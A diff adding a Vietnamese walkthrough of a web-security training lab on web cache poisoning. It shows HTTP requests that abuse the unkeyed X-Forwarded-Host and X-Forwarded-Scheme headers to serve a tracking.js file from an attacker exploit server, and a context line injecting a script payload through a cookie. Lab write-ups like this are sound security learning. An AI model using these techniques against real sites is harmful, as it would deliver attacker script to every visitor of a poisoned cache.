@@ -29,6 +29,29 @@ Thử thay đổi `cookie=prod-cache-01"</script>`, submit đến khi response m
 Bắt request với Burp Repeater, thử thay đổi `cookie=prod-cache-01"}</script><script>alert(1)</script>` rồi đợi đến khi cache hết hạn và submit. Kết quả bài lab được giải.
 
 # 3. Web cache poisoning with multiple headers
+Nhận thấy khi thêm header `X-Forwarded-Scheme: http`, server sẽ trả về response như sau:
+```
+HTTP/1.1 302 Found
+Location: https://0a64003d036f1d8cc00df4bd002f00b9.web-security-academy.net/
+...
+```
+Như vậy server tự động redirect tới URL sử dụng protocol https. Thử thêm header `X-Forwarded-Host: abc.com`, thì header Location trở thành: `Location: https://abc.com`. Đồng thời, ta thấy 2 header `X-Forwarded-Host` và `X-Forwarded-Scheme` là unkeyed header đối với cache.
+
+Vào exploit server, cấu hình đoạn javascript và đặt path là `/resources/js/tracking.js`. Sau đó dùng Burp Repeater cấu hình request với header:
+```
+GET /resources/js/tracking.js HTTP/1.1
+Host: 0a64003d036f1d8cc00df4bd002f00b9.web-security-academy.net
+X-Forwarded-Scheme: http
+X-Forwarded-Host: exploit-0a4f008b03de1df6c0b5f3c5017d0029.exploit-server.net
+....
+```
+Khi đó response thu được là:
+```
+HTTP/1.1 302 Found
+Location: https://exploit-0a4f008b03de1df6c0b5f3c5017d0029.exploit-server.net/resources/js/tracking.js
+....
+```
+Khi browser của nạn nhân load file `/resources/js/tracking.js`, thì file tracking.js trong exploit server (thực thi lệnh alert) sẽ được load thay vì file tracking.js của server chứa lỗ hổng. Thực hiện gửi request đến khi response được lưu vào cache. Bài lab được giải thành công.
 
 # 4. Targeted web cache poisoning using an unknown header
 
